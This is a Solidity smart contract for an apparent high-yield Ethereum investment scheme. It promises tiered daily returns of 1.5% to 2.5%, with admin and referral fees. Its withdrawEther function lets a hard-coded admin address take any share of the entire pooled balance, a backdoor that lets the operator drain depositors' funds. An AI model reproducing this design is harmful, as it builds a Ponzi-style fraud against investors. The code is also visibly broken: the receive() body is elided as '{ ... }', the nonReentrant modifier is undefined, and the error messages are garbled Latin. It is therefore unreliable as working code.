pragma solidity ^0.8;
contract unityOfEthereum {
    
    struct Investor
    {
        uint amount; 
        uint dateUpdate; 
        uint dateEnd;
        address refer; 
        bool active; 
    }
    
    uint constant private PERCENT_FOR_ADMIN = 10; 
    uint constant private PERCENT_FOR_REFER = 5; 
    address constant private ADMIN_ADDRESS = 0x6fc68a2888f1015cA458C801B8ACeEb941d535B2;
    mapping(address => Investor) investors; 
    event Transfer (address indexed _to, uint256 indexed _amount);
    
    constructor () {
    }
    
    function getPercent(Investor storage investor) private view returns (uint256) {
        uint256 amount = investor.amount;
        uint256 percent = 0;
        if (amount >= 0.0001 ether && amount <= 0.049 ether) percent = 15;
        if (amount >= 0.05 ether && amount <= 0.099 ether) percent = 20;
        if (amount >= 0.1 ether && amount <= 0.499 ether) percent = 21;
        if (amount >= 0.5 ether && amount <= 2.999 ether) percent = 22;
        if (amount >= 3 ether && amount <= 9.999 ether) percent = 23;
        if (amount >= 10 ether) percent = 25;
        return percent;
    }
    
    function getDate(Investor storage investor) private view returns (uint256) {
        uint256 amount = investor.amount;
        uint256 date = 0;
        if (amount >= 0.0001 ether && amount <= 0.049 ether) date = block.timestamp + 1 days;
        if (amount >= 0.05 ether && amount <= 0.099 ether) date = block.timestamp + 7 days;
        if (amount >= 0.1 ether && amount <= 0.499 ether) date = block.timestamp + 14 days;
        if (amount >= 0.5 ether && amount <= 2.999 ether) date = block.timestamp + 30 days;
        if (amount >= 3 ether && amount <= 9.999 ether) date = block.timestamp + 60 days;
        if (amount >= 10 ether) date = block.timestamp + 120 days;
        return date;
    }
    
    function getFeeForAdmin(uint256 amount) private pure returns (uint256) {
        return amount * PERCENT_FOR_ADMIN / 100;
    }

    function getFeeForRefer(uint256 amount) private pure returns (uint256) {
        return amount * PERCENT_FOR_REFER / 100;
    }

    function getProfit(Investor storage investor) private view returns (uint256) {
        uint256 amount = investor.amount;
        if (block.timestamp >= investor.dateEnd) {
            return amount + amount * getPercent(investor) * (investor.dateEnd - investor.dateUpdate) / (1 days * 1000);
        } else {
            return amount * getPercent(investor) * (block.timestamp - investor.dateUpdate) / (1 days * 1000);
        }
    }

    receive() external payable nonReentrant { ... }

    function showUnpayedPercent() public view returns (uint256) {
        return getProfit(investors[msg.sender]);
    }
    
    function setRefer(address _refer) public {
        require(_refer != address(0), "Irritum data");
        require(investors[msg.sender].refer == address(0), "In referrer est iam installed");
        
        investors[msg.sender].refer = _refer;
       
    }
    
    function withdrawEther(uint256 _amount) public {
        require(ADMIN_ADDRESS == msg.sender, "Access denied");

        uint256 payment = address(this).balance * _amount / 100;
        payable(ADMIN_ADDRESS).transfer(payment);
        emit Transfer(msg.sender, payment);
    }
    

}